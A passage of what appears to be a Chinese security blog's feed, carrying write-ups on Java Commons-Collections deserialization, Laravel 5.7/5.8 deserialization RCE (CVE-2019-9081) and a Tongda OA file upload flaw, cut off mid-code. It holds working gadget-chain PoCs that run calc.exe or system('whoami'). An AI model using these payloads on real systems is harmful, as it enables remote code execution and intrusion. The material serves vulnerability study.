<span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123;<span class="string">"calc.exe"</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        Map mapProxy = (Map)Proxy.newProxyInstance(test.class.getClassLoader(),outerMap.getClass().getInterfaces(),handler);</span><br><span class="line">        Constructor&lt;?&gt; outPro = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        outPro.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler out =(InvocationHandler) outPro.newInstance(Retention.class,mapProxy);</span><br><span class="line">        FileOutputStream fo = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"poc.ser"</span>));</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(fo);</span><br><span class="line">        obj.writeObject(out);</span><br><span class="line">        obj.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当反序列化时首先会触发<code>ObjectInputStream.readObject()</code>，由于<code>AnnotationInvocationHandler</code>中重写了<code>readobject</code>方法，接着会调用<code>AnnotationInvocationHandler.readObject()</code></p><p><img src="/2020/07/06/java反序列化漏洞学习记录/8.png" alt="8"></p><p>该处的<code>this.memberValues</code>为<code>mapProxy</code>动态代理，在352行调用了<code>entrySet</code>方法，这会触发动态代理，从而执行<code>AnnotationInvocationHandler.invoke()</code>方法</p><p><img src="/2020/07/06/java反序列化漏洞学习记录/9.png" alt="9"></p><p>这个时候<code>this.memberValues</code>是一个<code>LazyMap</code>实例，在78行处自然调用了<code>LazyMap.get()</code></p><p><img src="/2020/07/06/java反序列化漏洞学习记录/10.png" alt="10"></p><p>其中<code>this.factory</code>再此处是一个<code>ChainedTransformer</code>实例，在59行会调用<code>ChainedTransformer.transform()</code>方法，该方法会按顺序执行我们设置的<code>transformer</code>，在该处即为我们<code>poc</code>中的该段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123;<span class="string">"calc.exe"</span> &#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>该段代码主要是利用了<code>InvokerTransformer</code>利用反射机制可以调用任意函数的特性，实现了对<code>java.lang.Runtime</code> 类中<code>exec</code>方法的调用，进而执行任意命令</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;对近期java反序列化漏洞学习做个记录&lt;/p&gt;
&lt;h1 id=&quot;URLDNS&quot;&gt;&lt;a href=&quot;#URLDNS&quot; class=&quot;headerlink&quot; title=&quot;URLDNS&quot;&gt;&lt;/a&gt;URLDNS&lt;/h1&gt;&lt;p&gt;测试代码&lt;/p&gt;
&lt;figure class=&quot;hig
      
    
    </summary>
    
    
    
      <category term="java安全" scheme="https://yml-sec.top/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>laravel反序列化漏洞分析复现</title>
    <link href="https://yml-sec.top/2020/07/01/laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <id>https://yml-sec.top/2020/07/01/laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-07-01T04:35:40.000Z</published>
    <updated>2020-08-04T04:36:28.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="laravel5-7-CVE-2019-9081"><a href="#laravel5-7-CVE-2019-9081" class="headerlink" title="laravel5.7(CVE-2019-9081)"></a>laravel5.7(CVE-2019-9081)</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞起始点位于vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php中 PendingCommand类的__destruct方法 </p><p><img src="https://uploader.shimo.im/f/dbDE9lZANXW2lYKQ.png!thumbnail" alt="图片"></p><p>在220行调用了run方法，跟进该方法 </p><p><img src="https://uploader.shimo.im/f/jeBPwtyy9Svu1IfY.png!thumbnail" alt="图片"></p><p>首先代码段执行到 $this-&gt;mockConsoleOutput(); 跟进去看一下 </p><p><img src="https://uploader.shimo.im/f/rSDuEwyDIRWcuWgS.png!thumbnail" alt="图片"></p><p>我们的目的是走出 mockConsoleOutput函数，不影响正常执行代码即可，那么需要继续跟进162行的createABufferedOutputMock函数 </p><p><img src="https://uploader.shimo.im/f/G4Img0GJaJ6tCj5G.png!thumbnail" alt="图片"></p><p>我们需要正常执行195行的foreach函数，在这里$this-&gt;test我们可以控制，我们需要找到一个存在 expectedOutput属性的类进行进一步的操作，但是这样的类虽然存在,但是无法被框架自动加载，在这里我们可以使用<strong>get魔术方法，这里选择vendor\laravel\framework\src\Illuminate\Auth\GenericUser.php中GenericUser类的</strong>get方法 </p><p><img src="https://uploader.shimo.im/f/HnBnLHAAnT9HnKLP.png!thumbnail" alt="图片"></p><p>这里 $this-&gt;attributes我们可以控制，这样我们可以控制$this-&gt;test为GenericUser的一个对象，进而可以走过该处foreach的代码段，接着回到mockConsoleOutput方法，在165行同样存在着类似的foreach代码段，我们可以使用相同的方法正常走过该段代码，接着回到run方法，来到该段代码 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span><br></pre></td></tr></table></figure><p>调试发现Kernel::class的值为Illuminate\Contracts\Console\Kernel<br><img src="https://uploader.shimo.im/f/YwaYr62UbmUQPzq0.png!thumbnail" alt="图片"></p><p>继续跟踪调试，来到container类中的resolve方法，存在着下面的代码 </p><p><img src="https://uploader.shimo.im/f/QkysnaC1alQJZa4P.png!thumbnail" alt="图片"></p><p>跟进 getConcrete，存在如下代码段 </p><p><img src="https://uploader.shimo.im/f/tkRcmPDw1eVKOIqp.png!thumbnail" alt="图片"></p><p>在这里我们可以寻找一个继承了Container的类来控制 $this-&gt;bindings的值，这里选择了vendor\laravel\framework\src\Illuminate\Foundation\Application.php中的Application类，可以控制$this-&gt;bindings为如下值 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(&apos;Illuminate\Contracts\Console\Kernel&apos;=&gt;array(&apos;concrete&apos;=&gt;&apos;Illuminate\Foundation\Application&apos;))</span><br></pre></td></tr></table></figure><p>回到 resolve方法，会走到如下代码段<br><img src="https://uploader.shimo.im/f/bfnua8b4IPGsMlbL.png!thumbnail" alt="图片"></p><p>跟进isBuildable </p><p><img src="https://uploader.shimo.im/f/y85Bpuxw91TqtFNf.png!thumbnail" alt="图片"></p><p><img src="https://uploader.shimo.im/f/cuOmzsER8glEP3Jd.png!thumbnail" alt="图片"></p><p>很显然会走进上面的else分支调用make方法，跟进后发现代码段其实是重新做了一次上面的操作，重新调用了 getConcrete方法，最后进行Illuminate\Foundation\Application的build操作，最后 </p><p>$this-&gt;app[Kernel::class]返回的是Application的一个对象，接着会调用该对象的call方法，但是该对象中不存在call方法，进而会调用其父类Container中的call方法 </p><p><img src="https://uploader.shimo.im/f/vy2aLyMti0QHNAf3.png!thumbnail" alt="图片"></p><p>跟进 BoundMethod::call </p><p><img src="https://uploader.shimo.im/f/EdhtoKyf0asUwCwg.png!thumbnail" alt="图片"></p><p>该处调用了 call_user_func_array，我们知道该方法是可以执行代码的，调试后发现该处可以控制为如下的利用代码 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(&apos;system&apos;,array(&apos;whoami&apos;))</span><br></pre></td></tr></table></figure><h2 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $test; </span><br><span class="line">    <span class="keyword">protected</span> $app; </span><br><span class="line">    <span class="keyword">protected</span> $command; </span><br><span class="line">    <span class="keyword">protected</span> $parameters; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;app = <span class="keyword">new</span> Application(); </span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> GenericUser(); </span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = <span class="string">'system'</span>; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = <span class="keyword">array</span>(<span class="string">'whoami'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericUser</span></span>&#123; </span><br><span class="line"><span class="keyword">protected</span> $attributes; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;attributes = <span class="keyword">array</span>(<span class="string">'expectedQuestions'</span>=&gt;<span class="keyword">array</span>(<span class="string">'a'</span>=&gt;<span class="string">'b'</span>),<span class="string">'expectedOutput'</span>=&gt;<span class="keyword">array</span>(<span class="string">'c'</span>=&gt;<span class="string">'d'</span>)); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123; </span><br><span class="line"><span class="keyword">protected</span> $bindings = []; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;bindings=<span class="keyword">array</span>(<span class="string">'Illuminate\Contracts\Console\Kernel'</span>=&gt;<span class="keyword">array</span>(<span class="string">'concrete'</span>=&gt;<span class="string">'Illuminate\Foundation\Application'</span>),<span class="string">'Illuminate\Foundation\Application'</span>=&gt;<span class="keyword">array</span>(<span class="string">'concrete'</span>=&gt;<span class="string">'Illuminate\Foundation\Application'</span>)); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>\<span class="title">PendingCommand</span>; </span><br><span class="line">$a = <span class="keyword">new</span> PendingCommand(); </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h1 id="laravel5-8-一"><a href="#laravel5-8-一" class="headerlink" title="laravel5.8(一)"></a>laravel5.8(一)</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>起始点位于、vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php中的__destruct方法 </p><p><img src="https://uploader.shimo.im/f/ishNxe9mqbsTaChz.png!thumbnail" alt="图片"></p><p>该处的$this-&gt;events可控，我们可以利用该处调用位于 vendor\laravel\framework\src\Illuminate\Bus\Dispatcher.php中的dispatch方法 </p><p><img src="https://uploader.shimo.im/f/rG3nNFTpH1R3Za7q.png!thumbnail" alt="图片"></p><p>如果满足了if条件，代码会调用 dispatchToQueue方法，跟进该方法 </p><p><img src="https://uploader.shimo.im/f/s5CldQz1fD824KoV.png!thumbnail" alt="图片"></p><p>在150行处调用了 call_user_func，并且两个参数也是可控的，在该处我们可以达到执行命令的目的，那么回过来看一下如何满足前面的if条件 </p><p>$this-&gt;queueResolver需要存在，并且在call_user_func中作为第一个参数，我们直接控制要执行的函数名即可，接着是$this-&gt;commandShouldBeQueued($command)，跟进去看一下 </p><p><img src="https://uploader.shimo.im/f/2rqOINELsSc7ZaFd.png!thumbnail" alt="图片"></p><p>ShouldQueue是一个接口，我们需要将$command设置为一个ShouldQueue的实现类，这里选用vendor\laravel\framework\src\Illuminate\Broadcasting\BroadcastEvent.php中的类，同时为了满足call_user_func的第二个参数，我们需要在该类中设置一个connection属性。来作为调用函数的参数 </p><p>最后来梳理下利用链 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(PendingBroadcast)-&gt;__distruct() </span><br><span class="line">(Dispatcher)-&gt;dispatch() </span><br><span class="line">(Dispatcher)-&gt;dispatchToQueue()-&gt;call_user_func()</span><br></pre></td></tr></table></figure><h2 id="payload编写-1"><a href="#payload编写-1" class="headerlink" title="payload编写"></a>payload编写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">BroadcastEvent</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>\<span class="title">Dispatcher</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span>&#123; </span><br><span class="line"><span class="keyword">protected</span> $events; </span><br><span class="line"><span class="keyword">protected</span> $event; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent(); </span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> Dispatcher(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span></span>&#123; </span><br><span class="line"><span class="keyword">protected</span> $queueResolver; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;queueResolver = <span class="string">'system'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $connection; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="string">'whoami'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>; </span><br><span class="line">$a = <span class="keyword">new</span> PendingBroadcast(); </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/m0QRnaOhtuvVX5zj.png!thumbnail" alt="图片"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;laravel5-7-CVE-2019-9081&quot;&gt;&lt;a href=&quot;#laravel5-7-CVE-2019-9081&quot; class=&quot;headerlink&quot; title=&quot;laravel5.7(CVE-2019-9081)&quot;&gt;&lt;/a&gt;laravel5.7(CV
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意文件上传与文件包含分析</title>
    <link href="https://yml-sec.top/2020/05/15/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2020/05/15/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E6%9E%90/</id>
    <published>2020-05-15T04:26:38.000Z</published>
    <updated>2020-05-15T05:46:46.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>分析一下前段时间爆出的通达OA任意文件上传+文件包含漏洞，本文测试版本为11.3</p><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>漏洞触发点位于<code>/ispirit/im/upload.php</code>，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">"P"</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || ($P != <span class="string">""</span>)) &#123;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/session.php"</span>;</span><br><span class="line">session_id($P);</span><br><span class="line">session_start();</span><br><span class="line">session_write_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./auth.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/utility_file.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/utility_msg.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"mobile/inc/funcs.php"</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">"TYPE"</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">"DEST_UID"</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> (($DEST_UID != <span class="string">""</span>) &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . _(<span class="string">"接收方ID无效"</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">","</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . _(<span class="string">"接收方ID无效"</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$MODULE = <span class="string">"im"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">"1"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">"ATTACHMENT"</span>][<span class="string">"name"</span>])) != strlen($_FILES[<span class="string">"ATTACHMENT"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">$_FILES[<span class="string">"ATTACHMENT"</span>][<span class="string">"name"</span>] = urldecode($_FILES[<span class="string">"ATTACHMENT"</span>][<span class="string">"name"</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ATTACHMENTS = upload(<span class="string">"ATTACHMENT"</span>, $MODULE, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . $ATTACHMENTS);</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_end_clean();</span><br><span class="line">$ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">"ID"</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">$ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">"NAME"</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($TYPE == <span class="string">"mobile"</span>) &#123;</span><br><span class="line">$ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">"utf-8"</span>, MYOA_CHARSET);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . _(<span 